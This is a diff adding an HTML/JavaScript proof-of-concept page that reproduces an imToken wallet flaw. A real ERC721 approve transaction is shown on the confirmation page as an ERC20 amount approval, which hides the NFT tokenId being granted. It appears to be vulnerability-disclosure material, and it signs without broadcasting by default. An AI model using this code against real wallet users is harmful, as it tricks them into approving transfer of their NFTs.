@@ -1,0 +1,1449 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>EVM ERC721 approve tokenId omission PoC</title>
+  <style>
+    :root {
+      color-scheme: dark;
+      --bg: #0e1118;
+      --panel: #171c25;
+      --panel-2: #111721;
+      --line: #334155;
+      --text: #eef4ff;
+      --muted: #adbac9;
+      --accent: #2f81f7;
+      --ok: #3fb950;
+      --warn: #d29922;
+      --bad: #ff7b72;
+      --green: #238636;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+      background: var(--bg);
+      color: var(--text);
+    }
+
+    * { box-sizing: border-box; }
+    body { margin: 0; padding: 18px; }
+    main { max-width: 1180px; margin: 0 auto; }
+    h1 { margin: 0 0 8px; font-size: 22px; line-height: 1.25; }
+    h2 { margin: 0 0 10px; font-size: 16px; }
+    p { margin: 8px 0; color: var(--muted); line-height: 1.5; }
+    section {
+      margin: 14px 0;
+      padding: 14px;
+      border: 1px solid var(--line);
+      border-radius: 8px;
+      background: var(--panel);
+    }
+    code {
+      padding: 2px 5px;
+      border-radius: 6px;
+      background: var(--panel-2);
+      font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+      font-size: .92em;
+      word-break: break-all;
+    }
+    label {
+      display: block;
+      margin: 10px 0 6px;
+      color: #d8dee8;
+      font-size: 14px;
+    }
+    input, button, textarea, select {
+      width: 100%;
+      border: 1px solid #38465a;
+      border-radius: 8px;
+      background: var(--panel-2);
+      color: var(--text);
+      padding: 10px;
+      font-size: 15px;
+    }
+    textarea {
+      min-height: 178px;
+      resize: vertical;
+      font: 12px/1.5 ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+      white-space: pre;
+    }
+    button {
+      margin-top: 10px;
+      border: 0;
+      background: var(--accent);
+      font-weight: 700;
+      cursor: pointer;
+    }
+    button.secondary { background: #303844; }
+    button.safe { background: var(--green); }
+    button.danger { background: #da3633; }
+    button:disabled { opacity: .55; cursor: not-allowed; }
+    pre {
+      margin: 0;
+      min-height: 180px;
+      overflow: auto;
+      white-space: pre-wrap;
+      word-break: break-word;
+      border: 1px solid var(--line);
+      border-radius: 8px;
+      background: var(--panel-2);
+      padding: 12px;
+      font: 12px/1.5 ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+    }
+    .grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(235px, 1fr));
+      gap: 10px;
+    }
+    .actions, .launcher {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(215px, 1fr));
+      gap: 10px;
+      margin-top: 10px;
+    }
+    .summary {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(245px, 1fr));
+      gap: 10px;
+      margin-top: 12px;
+    }
+    .summary-item {
+      min-height: 84px;
+      border: 1px solid var(--line);
+      border-radius: 8px;
+      background: var(--panel-2);
+      padding: 12px;
+    }
+    .summary-item strong {
+      display: block;
+      margin-bottom: 6px;
+      color: #f3f6fb;
+      font-size: 13px;
+    }
+    .summary-item span {
+      color: var(--muted);
+      font-size: 13px;
+      overflow-wrap: anywhere;
+    }
+    .badge {
+      display: inline-flex;
+      align-items: center;
+      max-width: 100%;
+      min-height: 25px;
+      margin-top: 8px;
+      padding: 3px 8px;
+      border-radius: 999px;
+      background: #303844;
+      color: #d7dee8;
+      font-size: 12px;
+      font-weight: 700;
+      overflow-wrap: anywhere;
+    }
+    .badge.ok { background: #1f6f3d; color: #d7ffdf; }
+    .badge.warn { background: #593f10; color: #ffe3a3; }
+    .warn {
+      border-color: var(--warn);
+      background: #261b07;
+      color: #ffdf8a;
+    }
+    .danger-note {
+      border-color: #7f3434;
+      background: #2a1214;
+      color: #ffc9c5;
+    }
+    .hidden { color: var(--bad) !important; }
+    .visible { color: var(--ok) !important; }
+    a.button-link {
+      display: block;
+      width: 100%;
+      border-radius: 8px;
+      background: var(--green);
+      color: #fff;
+      padding: 10px;
+      text-align: center;
+      text-decoration: none;
+      font-size: 15px;
+      font-weight: 700;
+    }
+    a.button-link.secondary { background: #303844; }
+    .check-row {
+      display: flex;
+      align-items: flex-start;
+      gap: 8px;
+      margin-top: 12px;
+      color: #d8dee8;
+      font-size: 14px;
+      line-height: 1.45;
+    }
+    .check-row input {
+      width: auto;
+      min-width: 18px;
+      margin-top: 2px;
+    }
+    .nft-panel {
+      display: grid;
+      grid-template-columns: 150px minmax(0, 1fr);
+      gap: 14px;
+      align-items: center;
+    }
+    .nft-art {
+      width: 150px;
+      aspect-ratio: 1;
+      border: 1px solid var(--line);
+      border-radius: 8px;
+      overflow: hidden;
+      background: var(--panel-2);
+    }
+    .nft-art img {
+      display: block;
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+    }
+    .kv {
+      display: grid;
+      grid-template-columns: 120px minmax(0, 1fr);
+      gap: 7px 10px;
+      font-size: 13px;
+    }
+    .kv div:nth-child(odd) { color: var(--muted); }
+    .kv div:nth-child(even) { overflow-wrap: anywhere; }
+    @media (max-width: 680px) {
+      body { padding: 12px; }
+      .nft-panel { grid-template-columns: 1fr; }
+      .nft-art { width: 100%; max-width: 260px; }
+      .kv { grid-template-columns: 1fr; }
+      .summary-item { min-height: 0; }
+    }
+  </style>
+</head>
+<body>
+<main>
+  <h1>EVM ERC721 approve tokenId omission PoC</h1>
+  <p>
+    本页发起标准 <code>eth_sendTransaction</code> / <code>ethereum.signTransaction</code>，
+    calldata 是真实 ERC721 <code>approve(address,uint256)</code>。selector 与 ERC20 approve 相同，
+    当前确认页会进入 ERC20 金额授权预览，但签名材料仍批准指定 NFT tokenId。
+  </p>
+
+  <section class="warn">
+    默认按钮只签不广播。真实广播会把指定 NFT 的 <code>getApproved(tokenId)</code>
+    改成 spender；只有在你确认该 tokenId 属于当前账户、且接受授权结果时再使用广播按钮。
+  </section>
+
+  <section>
+    <h2>打开方式</h2>
+    <p>在系统浏览器打开本地服务的 <code>/dapp-link</code>，跳入 imToken DAppView 后连接 EVM 账户。</p>
+    <div class="launcher">
+      <a id="openImToken" class="button-link" href="#">Open in imToken</a>
+      <a id="openUniversal" class="button-link secondary" href="#">Open through token.im</a>
+    </div>
+    <span id="environment" class="badge">环境检测中</span>
+  </section>
+
+  <section>
+    <h2>PoC 参数</h2>
+    <div class="grid">
+      <div>
+        <label for="preset">网络预设</label>
+        <select id="preset">
+          <option value="ethereum">Ethereum Mainnet</option>
+          <option value="polygon">Polygon</option>
+          <option value="bsc">BNB Smart Chain</option>
+          <option value="arbitrum">Arbitrum One</option>
+          <option value="sepolia">Sepolia</option>
+        </select>
+      </div>
+      <div>
+        <label for="chainId">chainId</label>
+        <input id="chainId" value="1" inputmode="numeric">
+      </div>
+      <div>
+        <label for="chainIdHex">chainId hex</label>
+        <input id="chainIdHex" value="0x1" readonly>
+      </div>
+      <div>
+        <label for="from">from</label>
+        <input id="from" value="" placeholder="连接后自动填入 0x..." autocomplete="off">
+      </div>
+      <div>
+        <label for="nftContract">ERC721 contract / tx.to</label>
+        <input id="nftContract" value="0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D" autocomplete="off">
+      </div>
+      <div>
+        <label for="tokenId">ERC721 tokenId</label>
+        <input id="tokenId" value="1234" inputmode="numeric">
+      </div>
+      <div>
+        <label for="spender">spender / approved address</label>
+        <input id="spender" value="0x2222222222222222222222222222222222222222" autocomplete="off">
+      </div>
+      <div>
+        <label for="nftSymbol">mock/metadata symbol</label>
+        <input id="nftSymbol" value="BAYC">
+      </div>
+      <div>
+        <label for="nftName">mock/metadata NFT name</label>
+        <input id="nftName" value="Bored Ape Yacht Club #1234">
+      </div>
+      <div>
+        <label for="nftImageUrl">mock/metadata NFT image URL</label>
+        <input id="nftImageUrl" value="" placeholder="可留空，服务会使用本地占位 NFT 图">
+      </div>
+      <div>
+        <label for="gas">gas / gasLimit</label>
+        <input id="gas" value="85000" inputmode="numeric">
+      </div>
+      <div>
+        <label for="gasPrice">gasPrice wei</label>
+        <input id="gasPrice" value="" placeholder="可留空让钱包估算" inputmode="numeric">
+      </div>
+      <div>
+        <label for="mockBaseUrl">mock 服务 base URL</label>
+        <input id="mockBaseUrl" value="" placeholder="例：http://192.168.10.77:8792">
+      </div>
+    </div>
+    <div class="actions">
+      <button id="sdkProbe" class="secondary">0. SDK 回调探测</button>
+      <button id="connect" class="secondary">1. 连接 / 读取账户</button>
+      <button id="switchChain" class="secondary">2. 切换到当前链</button>
+      <button id="probeNft" class="secondary">3. 读取 NFT owner/metadata</button>
+      <button id="build">4. 构造 approve payload</button>
+      <button id="mockPreview" class="secondary">5. 请求 mock wallet.signPreview</button>
+      <button id="signOnly" class="safe">6. 真实确认页：只签不广播</button>
+      <button id="sendTx" class="danger">7. 真实确认页：签名并广播</button>
+      <button id="checkApproved" class="secondary">8. 查询 getApproved(tokenId)</button>
+    </div>
+    <label class="check-row" for="broadcastAck">
+      <input id="broadcastAck" type="checkbox">
+      <span>我确认当前账户拥有该 NFT，并接受广播后 spender 会获得这个 tokenId 的转移授权。</span>
+    </label>
+  </section>
+
+  <section>
+    <h2>复现观察点</h2>
+    <div class="summary">
+      <div class="summary-item">
+        <strong>selector 碰撞</strong>
+        <span id="selectorStatus" class="visible">尚未生成</span>
+      </div>
+      <div class="summary-item">
+        <strong>当前预览分支</strong>
+        <span id="branch" class="hidden">尚未生成</span>
+      </div>
+      <div class="summary-item">
+        <strong>确认页可见</strong>
+        <span id="visiblePreview">尚未生成</span>
+      </div>
+      <div class="summary-item">
+        <strong>确认页缺失</strong>
+        <span id="hiddenNft" class="hidden">尚未生成</span>
+      </div>
+      <div class="summary-item">
+        <strong>当前链 / 账户</strong>
+        <span id="currentAccount">尚未读取</span>
+      </div>
+      <div class="summary-item">
+        <strong>owner / approved</strong>
+        <span id="ownershipStatus">尚未读取</span>
+      </div>
+      <div class="summary-item">
+        <strong>签名 / 广播结果</strong>
+        <span id="txStatus">尚未发起</span>
+      </div>
+      <div class="summary-item">
+        <strong>最终签名材料</strong>
+        <span id="signedStatus">尚未签名</span>
+      </div>
+    </div>
+  </section>
+
+  <section>
+    <h2>NFT sidecar 数据</h2>
+    <div class="nft-panel">
+      <div class="nft-art"><img id="nftImage" alt="NFT preview" src=""></div>
+      <div class="kv">
+        <div>collection</div><div id="nftCollectionText">尚未读取</div>
+        <div>tokenId</div><div id="nftTokenIdText">1234</div>
+        <div>name</div><div id="nftNameText">Bored Ape Yacht Club #1234</div>
+        <div>image</div><div id="nftImageText">本地占位图</div>
+      </div>
+    </div>
+    <p>
+      mock preview 会把这些 NFT 字段放进 <code>addressInfos[to].addressExtraInfo.tokenids[tokenId]</code>。
+      当前 ERC20 approve 详情页仍只消费 symbol/decimals/logo，因此 NFT item 语义不会出现在主授权行。
+    </p>
+  </section>
+
+  <section class="danger-note">
+    <h2>广播条件</h2>
+    <p>
+      如果 <code>ownerOf(tokenId)</code> 不是当前账户，合约会拒绝 approve，无法得到链上成功授权证据。
+      这种情况下仍可用“只签不广播”观察真实确认页，并用 decoded raw tx 证明签名材料保留 NFT approve calldata。
+    </p>
+  </section>
+
+  <section>
+    <h2>完整交易 payload</h2>
+    <textarea id="payload" spellcheck="false"></textarea>
+  </section>
+
+  <section>
+    <h2>mock wallet.signPreview 响应</h2>
+    <textarea id="preview" spellcheck="false"></textarea>
+  </section>
+
+  <section>
+    <h2>签名/广播回执</h2>
+    <textarea id="receipt" spellcheck="false"></textarea>
+  </section>
+
+  <section>
+    <h2>日志</h2>
+    <pre id="log"></pre>
+  </section>
+</main>
+
+<script>
+  const $ = (id) => document.getElementById(id)
+  const ZERO_ADDRESS = '0x0000000000000000000000000000000000000000'
+  const APPROVE_SELECTOR = '0x095ea7b3'
+  const OWNER_OF_SELECTOR = '0x6352211e'
+  const GET_APPROVED_SELECTOR = '0x081812fc'
+  const BALANCE_OF_SELECTOR = '0x70a08231'
+  const SUPPORTS_INTERFACE_SELECTOR = '0x01ffc9a7'
+  const NAME_SELECTOR = '0x06fdde03'
+  const SYMBOL_SELECTOR = '0x95d89b41'
+  const TOKEN_URI_SELECTOR = '0xc87b56dd'
+  const ERC721_INTERFACE_ID = '80ac58cd'
+
+  const NETWORKS = {
+    ethereum: {
+      chainId: '1',
+      chainName: 'Ethereum Mainnet',
+      nativeSymbol: 'ETH',
+      rpcUrls: ['https://cloudflare-eth.com'],
+      blockExplorerUrls: ['https://etherscan.io'],
+      defaultNft: '0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D',
+      defaultSymbol: 'BAYC',
+    },
+    polygon: {
+      chainId: '137',
+      chainName: 'Polygon',
+      nativeSymbol: 'MATIC',
+      rpcUrls: ['https://polygon-rpc.com'],
+      blockExplorerUrls: ['https://polygonscan.com'],
+      defaultNft: '0x0000000000000000000000000000000000000000',
+      defaultSymbol: 'NFT',
+    },
+    bsc: {
+      chainId: '56',
+      chainName: 'BNB Smart Chain',
+      nativeSymbol: 'BNB',
+      rpcUrls: ['https://bsc-dataseed.binance.org'],
+      blockExplorerUrls: ['https://bscscan.com'],
+      defaultNft: '0x0000000000000000000000000000000000000000',
+      defaultSymbol: 'NFT',
+    },
+    arbitrum: {
+      chainId: '42161',
+      chainName: 'Arbitrum One',
+      nativeSymbol: 'ETH',
+      rpcUrls: ['https://arb1.arbitrum.io/rpc'],
+      blockExplorerUrls: ['https://arbiscan.io'],
+      defaultNft: '0x0000000000000000000000000000000000000000',
+      defaultSymbol: 'NFT',
+    },
+    sepolia: {
+      chainId: '11155111',
+      chainName: 'Sepolia',
+      nativeSymbol: 'ETH',
+      rpcUrls: ['https://rpc.sepolia.org'],
+      blockExplorerUrls: ['https://sepolia.etherscan.io'],
+      defaultNft: '0x0000000000000000000000000000000000000000',
+      defaultSymbol: 'NFT',
+    },
+  }
+
+  const state = {
+    account: '',
+    chainIdHex: '',
+    payload: null,
+    preview: null,
+    signedRaw: '',
+    nftOwner: '',
+    approved: '',
+    supports721: null,
+    nftNameTouched: false,
+    lastAutoNftName: 'Bored Ape Yacht Club #1234',
+  }
+
+  function getSearchParam(name) {
+    return new URLSearchParams(location.search).get(name) || ''
+  }
+
+  function setupQueryDefaults() {
+    const mockBase = getSearchParam('mockBase') || getSearchParam('mockBaseUrl')
+    if (mockBase) $('mockBaseUrl').value = mockBase.replace(/\/+$/, '')
+    const preset = getSearchParam('preset')
+    if (preset && NETWORKS[preset]) $('preset').value = preset
+    ;[
+      'chainId',
+      'from',
+      'nftContract',
+      'tokenId',
+      'spender',
+      'nftSymbol',
+      'nftName',
+      'nftImageUrl',
+      'gas',
+      'gasPrice',
+    ].forEach((id) => {
+      const value = getSearchParam(id)
+      if (value) {
+        $(id).value = value
+        if (id === 'nftName') state.nftNameTouched = true
+      }
+    })
+  }
+
+  function setupLauncher() {
+    const title = 'EVM ERC721 approve tokenId PoC'
+    const targetUrl = getLauncherTargetUrl()
+    $('openImToken').href =
+      `imtokenv2://navigate/DappView?url=${encodeURIComponent(targetUrl)}&title=${encodeURIComponent(title)}`
+    $('openUniversal').href =
+      `https://token.im/link/navigate/DappView?url=${encodeURIComponent(targetUrl)}&title=${encodeURIComponent(title)}`
+  }
+
+  function getLauncherTargetUrl() {
+    const target = new URL(location.href.split('#')[0])
+    const mockBase = getMockBaseUrl()
+    if (mockBase) target.searchParams.set('mockBase', mockBase)
+    ;[
+      'preset',
+      'chainId',
+      'nftContract',
+      'tokenId',
+      'spender',
+      'nftSymbol',
+      'nftName',
+      'nftImageUrl',
+      'gas',
+      'gasPrice',
+    ].forEach((id) => target.searchParams.set(id, $(id).value.trim()))
+    return target.toString()
+  }
+
+  function isGithubPages() {
+    return /\.github\.io$/i.test(location.hostname)
+  }
+
+  function getMockBaseUrl() {
+    return $('mockBaseUrl').value.trim().replace(/\/+$/, '')
+  }
+
+  function getMockPreviewEndpoint() {
+    const base = getMockBaseUrl()
+    return base ? `${base}/mock-wallet-sign-preview` : '/mock-wallet-sign-preview'
+  }
+
+  function localNftImageUrl() {
+    const base = getMockBaseUrl() || (location.protocol.startsWith('http') ? location.origin : '')
+    return base ? `${base}/nft-image.svg?tokenId=${encodeURIComponent($('tokenId').value.trim() || '0')}` : ''
+  }
+
+  function safeJson(value) {
+    try {
+      return typeof value === 'string' ? JSON.parse(value) : value
+    } catch (_e) {
+      return value
+    }
+  }
+
+  function jsonReplacer(_key, value) {
+    if (typeof value === 'bigint') return value.toString()
+    if (value instanceof Uint8Array) return bytesToHex(value)
+    return value
+  }
+
+  function log(message, obj) {
+    const extra = obj === undefined ? '' : `\n${JSON.stringify(obj, jsonReplacer, 2)}`
+    $('log').textContent = `${new Date().toISOString()} ${message}${extra}\n\n${$('log').textContent}`
+  }
+
+  function environmentInfo() {
+    return {
+      href: location.href,
+      protocol: location.protocol,
+      userAgent: navigator.userAgent,
+      hasWindowEthereum: !!window.ethereum,
+      hasEthereumRequest: !!(window.ethereum && window.ethereum.request),
+      hasWindowImToken: !!window.imToken,
+      hasCallPromisifyAPI: !!(window.imToken && window.imToken.callPromisifyAPI),
+      selectedAddress: window.ethereum && window.ethereum.selectedAddress,
+      providerChainId: window.ethereum && window.ethereum.chainId,
+      isGithubPages: isGithubPages(),
+      mockBaseUrl: getMockBaseUrl(),
+      mockPreviewEndpoint: getMockPreviewEndpoint(),
+    }
+  }
+
+  function refreshEnvironment() {
+    const info = environmentInfo()
+    const ok = info.hasEthereumRequest || info.hasCallPromisifyAPI
+    const mockMode = info.mockBaseUrl
+      ? '外部 mock 已配置'
+      : info.isGithubPages
+        ? 'GitHub 静态页，同源 mock 不可用'
+        : '同源 mock'
+    $('environment').textContent = ok
+      ? `已检测到 EVM Provider${info.providerChainId ? `，chainId=${info.providerChainId}` : ''}；${mockMode}`
+      : `普通浏览器模式；${mockMode}`
+    $('environment').className = `badge ${ok ? 'ok' : 'warn'}`
+  }
+
+  function installBridgeDebugHooks() {
+    if (!window.imToken || window.__erc721ApproveBridgeDebugInstalled) return
+    if (typeof window.imToken.postMessage === 'function') {
+      const originalPostMessage = window.imToken.postMessage.bind(window.imToken)
+      window.imToken.postMessage = function (content) {
+        log('imToken.postMessage 发出', safeJson(content))
+        return originalPostMessage(content)
+      }
+    }
+    if (typeof window.imToken._handleApiCallback === 'function') {
+      const originalCallback = window.imToken._handleApiCallback.bind(window.imToken)
+      window.imToken._handleApiCallback = function (data) {
+        log('native callback 收到', data)
+        return originalCallback(data)
+      }
+    }
+    window.addEventListener('message', (event) => {
+      const data = safeJson(event.data)
+      if (data && data.apiName && data.messageId) {
+        log('window.message 收到 SDK payload', { data, origin: event.origin })
+      }
+    })
+    window.__erc721ApproveBridgeDebugInstalled = true
+  }
+
+  function withTimeout(promise, label, ms) {
+    let timer
+    const timeout = new Promise((_resolve, reject) => {
+      timer = setTimeout(() => reject(new Error(`${label} 超时 ${ms / 1000}s`)), ms)
+    })
+    return Promise.race([promise, timeout]).finally(() => clearTimeout(timer))
+  }
+
+  async function callImToken(apiName, payload, timeoutMs = 15000) {
+    installBridgeDebugHooks()
+    if (!window.imToken || typeof window.imToken.callPromisifyAPI !== 'function') {
+      throw new Error(`未检测到 window.imToken.callPromisifyAPI，无法调用 ${apiName}`)
+    }
+    return withTimeout(window.imToken.callPromisifyAPI(apiName, payload), apiName, timeoutMs)
+  }
+
+  async function requestEthereum(method, params = [], timeoutMs = 30000) {
+    installBridgeDebugHooks()
+    const payload = { jsonrpc: '2.0', id: Date.now(), method, params }
+    log(`EVM provider request: ${method}`, payload)
+    if (window.ethereum && typeof window.ethereum.request === 'function') {
+      return withTimeout(window.ethereum.request({ method, params }), method, timeoutMs)
+    }
+    if (window.imToken && typeof window.imToken.callPromisifyAPI === 'function') {
+      const response = await callImToken('ethereum.sendAsync', payload, timeoutMs)
+      if (response && response.error) throw new Error(response.error.message || JSON.stringify(response.error))
+      return response && Object.prototype.hasOwnProperty.call(response, 'result')
+        ? response.result
+        : response
+    }
+    throw new Error('未检测到 EVM provider，请在 imToken DApp 浏览器中打开本页')
+  }
+
+  async function probeSdkCallback() {
+    installBridgeDebugHooks()
+    refreshEnvironment()
+    log('普通 SDK 回调探测开始', environmentInfo())
+    const language = await callImToken('device.getCurrentLanguage', {}, 8000)
+    log('普通 SDK 回调探测成功', { language })
+  }
+
+  async function connectWallet() {
+    refreshEnvironment()
+    const accounts = await requestEthereum('eth_requestAccounts', [], 30000)
+    const first = Array.isArray(accounts) ? accounts[0] : accounts
+    if (first) {
+      state.account = first
+      $('from').value = first
+    }
+    state.chainIdHex = await requestEthereum('eth_chainId', [], 12000)
+    $('currentAccount').textContent = `${state.chainIdHex || 'unknown'} / ${$('from').value || 'unknown'}`
+    refreshEnvironment()
+    updatePreviewModel()
+    log('已读取当前 EVM 账户', { accounts, chainId: state.chainIdHex })
+  }
+
+  async function switchToPresetChain() {
+    const chainIdHex = decimalToHex(assertUintField('chainId'))
+    try {
+      await requestEthereum('wallet_switchEthereumChain', [{ chainId: chainIdHex }], 30000)
+    } catch (e) {
+      const preset = getPreset()
+      log('wallet_switchEthereumChain 失败，尝试 wallet_addEthereumChain', { message: e.message })
+      await requestEthereum('wallet_addEthereumChain', [{
+        chainId: chainIdHex,
+        chainName: preset.chainName,
+        nativeCurrency: {
+          name: preset.nativeSymbol,
+          symbol: preset.nativeSymbol,
+          decimals: 18,
+        },
+        rpcUrls: preset.rpcUrls,
+        blockExplorerUrls: preset.blockExplorerUrls,
+      }], 30000)
+    }
+    state.chainIdHex = await requestEthereum('eth_chainId', [], 12000)
+    $('currentAccount').textContent = `${state.chainIdHex || 'unknown'} / ${$('from').value || 'unknown'}`
+    log('已切换/确认当前链', { chainId: state.chainIdHex })
+  }
+
+  function strip0x(value) {
+    return String(value || '').replace(/^0x/i, '')
+  }
+
+  function normalizeHex(value) {
+    return `0x${strip0x(value).toLowerCase()}`
+  }
+
+  function decimalToHex(value) {
+    const next = BigInt(String(value || '0'))
+    if (next < 0n) throw new Error('不支持负数')
+    return `0x${next.toString(16)}`
+  }
+
+  function hexToDecimal(value) {
+    if (!value) return '0'
+    return BigInt(String(value).toLowerCase()).toString(10)
+  }
+
+  function isHexQuantity(value) {
+    return /^0x[0-9a-f]+$/i.test(String(value || ''))
+  }
+
+  function parseChainId(value) {
+    if (isHexQuantity(value)) return BigInt(value).toString(10)
+    return String(value || '').trim()
+  }
+
+  function padWord(hex) {
+    const clean = strip0x(hex)
+    if (clean.length > 64) throw new Error(`ABI word 过长: ${hex}`)
+    return clean.padStart(64, '0')
+  }
+
+  function assertAddressValue(value, label) {
+    const next = String(value || '').trim()
+    if (!/^0x[0-9a-fA-F]{40}$/.test(next)) {
+      throw new Error(`${label} 必须是 0x 开头的 20 字节 EVM 地址`)
+    }
+    return next
+  }
+
+  function assertUintValue(value, label) {
+    const next = String(value || '').trim()
+    if (!/^[0-9]+$/.test(next)) throw new Error(`${label} 必须是非负整数`)
+    return next
+  }
+
+  function assertUintField(id) {
+    return assertUintValue($(id).value.trim(), id)
+  }
+
+  function assertAddress(id) {
+    return assertAddressValue($(id).value.trim(), id)
+  }
+
+  function encodeAbiUint(value) {
+    return padWord(decimalToHex(assertUintValue(value, 'uint256')))
+  }
+
+  function encodeAbiAddress(value, label) {
+    return padWord(assertAddressValue(value, label))
+  }
+
+  function encodeApprove(spender, tokenId) {
+    return normalizeHex(`${APPROVE_SELECTOR}${encodeAbiAddress(spender, 'spender')}${encodeAbiUint(tokenId)}`)
+  }
+
+  function decodeApproveData(data) {
+    const normalized = normalizeHex(data)
+    if (!normalized.startsWith(APPROVE_SELECTOR)) return null
+    const body = strip0x(normalized).slice(8)
+    if (body.length < 128) return null
+    const spenderWord = body.slice(0, 64)
+    const tokenIdWord = body.slice(64, 128)
+    return {
+      selector: APPROVE_SELECTOR,
+      spender: `0x${spenderWord.slice(-40)}`,
+      tokenId: BigInt(`0x${tokenIdWord}`).toString(10),
+      rawSecondUint256: `0x${tokenIdWord}`,
+    }
+  }
+
+  function encodeCall(selector, words) {
+    return normalizeHex(`${selector}${words.join('')}`)
+  }
+
+  function encodeOwnerOf(tokenId) {
+    return encodeCall(OWNER_OF_SELECTOR, [encodeAbiUint(tokenId)])
+  }
+
+  function encodeGetApproved(tokenId) {
+    return encodeCall(GET_APPROVED_SELECTOR, [encodeAbiUint(tokenId)])
+  }
+
+  function encodeBalanceOf(address) {
+    return encodeCall(BALANCE_OF_SELECTOR, [encodeAbiAddress(address, 'owner')])
+  }
+
+  function encodeSupportsInterface(interfaceId) {
+    const clean = strip0x(interfaceId)
+    if (!/^[0-9a-fA-F]{8}$/.test(clean)) throw new Error('interfaceId 必须是 bytes4')
+    return encodeCall(SUPPORTS_INTERFACE_SELECTOR, [clean.padEnd(64, '0')])
+  }
+
+  function encodeTokenURI(tokenId) {
+    return encodeCall(TOKEN_URI_SELECTOR, [encodeAbiUint(tokenId)])
+  }
+
+  function decodeAddressResult(hex) {
+    const clean = strip0x(hex)
+    if (clean.length < 64) return ''
+    return `0x${clean.slice(24, 64)}`.toLowerCase()
+  }
+
+  function decodeBoolResult(hex) {
+    const clean = strip0x(hex)
+    if (clean.length < 64) return null
+    return BigInt(`0x${clean.slice(-64)}`) !== 0n
+  }
+
+  function decodeUintResult(hex) {
+    const clean = strip0x(hex)
+    if (clean.length < 64) return ''
+    return BigInt(`0x${clean.slice(-64)}`).toString(10)
+  }
+
+  function hexToUtf8(hex) {
+    const clean = strip0x(hex)
+    const bytes = []
+    for (let i = 0; i < clean.length; i += 2) {
+      const byte = parseInt(clean.slice(i, i + 2), 16)
+      if (Number.isFinite(byte)) bytes.push(byte)
+    }
+    return new TextDecoder().decode(Uint8Array.from(bytes)).replace(/\0+$/g, '')
+  }
+
+  function decodeStringResult(hex) {
+    const clean = strip0x(hex)
+    if (!clean) return ''
+    if (clean.length === 64) return hexToUtf8(clean)
+    if (clean.length < 128) return hexToUtf8(clean)
+    const offset = Number(BigInt(`0x${clean.slice(0, 64)}`))
+    const lenOffset = offset * 2
+    if (!Number.isFinite(offset) || clean.length < lenOffset + 64) return hexToUtf8(clean)
+    const length = Number(BigInt(`0x${clean.slice(lenOffset, lenOffset + 64)}`))
+    const start = lenOffset + 64
+    return hexToUtf8(clean.slice(start, start + length * 2))
+  }
+
+  async function ethCall(to, data, timeoutMs = 20000) {
+    return requestEthereum('eth_call', [{ to, data }, 'latest'], timeoutMs)
+  }
+
+  async function safeEthCall(label, to, data, decoder) {
+    try {
+      const raw = await ethCall(to, data)
+      return { ok: true, label, raw, value: decoder(raw) }
+    } catch (e) {
+      return { ok: false, label, error: e.message }
+    }
+  }
+
+  function normalizeMetadataUrl(url) {
+    const raw = String(url || '').trim()
+    if (!raw) return ''
+    if (raw.startsWith('ipfs://ipfs/')) return `https://ipfs.io/ipfs/${raw.slice('ipfs://ipfs/'.length)}`
+    if (raw.startsWith('ipfs://')) return `https://ipfs.io/ipfs/${raw.slice('ipfs://'.length)}`
+    return raw
+  }
+
+  async function fetchMetadataThroughServer(tokenUri) {
+    const normalized = normalizeMetadataUrl(tokenUri)
+    if (!normalized || !getMockBaseUrl()) return null
+    const url = `${getMockBaseUrl()}/metadata-proxy?url=${encodeURIComponent(normalized)}`
+    const response = await fetch(url)
+    const data = await response.json()
+    if (!response.ok) throw new Error(data.error || `HTTP ${response.status}`)
+    return data
+  }
+
+  async function probeNftState() {
+    if (!$('from').value.trim()) await connectWallet()
+    const contract = assertAddress('nftContract')
+    const tokenId = assertUintField('tokenId')
+    const from = assertAddressValue($('from').value.trim(), 'from')
+    const calls = {
+      supports721: await safeEthCall('supportsInterface', contract, encodeSupportsInterface(ERC721_INTERFACE_ID), decodeBoolResult),
+      ownerOf: await safeEthCall('ownerOf', contract, encodeOwnerOf(tokenId), decodeAddressResult),
+      getApproved: await safeEthCall('getApproved', contract, encodeGetApproved(tokenId), decodeAddressResult),
+      balanceOf: await safeEthCall('balanceOf', contract, encodeBalanceOf(from), decodeUintResult),
+      name: await safeEthCall('name', contract, NAME_SELECTOR, decodeStringResult),
+      symbol: await safeEthCall('symbol', contract, SYMBOL_SELECTOR, decodeStringResult),
+      tokenURI: await safeEthCall('tokenURI', contract, encodeTokenURI(tokenId), decodeStringResult),
+    }
+    state.supports721 = calls.supports721.ok ? calls.supports721.value : null
+    state.nftOwner = calls.ownerOf.ok ? calls.ownerOf.value : ''
+    state.approved = calls.getApproved.ok ? calls.getApproved.value : ''
+    if (calls.symbol.ok && calls.symbol.value) $('nftSymbol').value = calls.symbol.value
+    if (calls.name.ok && calls.name.value && !$('nftName').value.trim()) {
+      $('nftName').value = `${calls.name.value} #${tokenId}`
+      state.nftNameTouched = true
+    }
+    if (calls.tokenURI.ok && calls.tokenURI.value) {
+      try {
+        const metadata = await fetchMetadataThroughServer(calls.tokenURI.value)
+        if (metadata) {
+          if (metadata.name) {
+            $('nftName').value = metadata.name
+            state.nftNameTouched = true
+          }
+          if (metadata.image) $('nftImageUrl').value = normalizeMetadataUrl(metadata.image)
+        }
+      } catch (e) {
+        log('metadata proxy 读取失败，保留链上 tokenURI 作为证据', { message: e.message })
+      }
+    }
+    updateNftSidecar()
+    updateOwnershipStatus()
+    updatePreviewModel()
+    log('NFT owner/metadata 读取完成', calls)
+  }
+
+  async function checkApproved() {
+    const contract = assertAddress('nftContract')
+    const tokenId = assertUintField('tokenId')
+    const result = await safeEthCall('getApproved', contract, encodeGetApproved(tokenId), decodeAddressResult)
+    if (result.ok) state.approved = result.value
+    updateOwnershipStatus()
+    log('getApproved(tokenId) 查询完成', result)
+  }
+
+  function getPreset() {
+    return NETWORKS[$('preset').value] || NETWORKS.ethereum
+  }
+
+  function applyPreset() {
+    const preset = getPreset()
+    $('chainId').value = preset.chainId
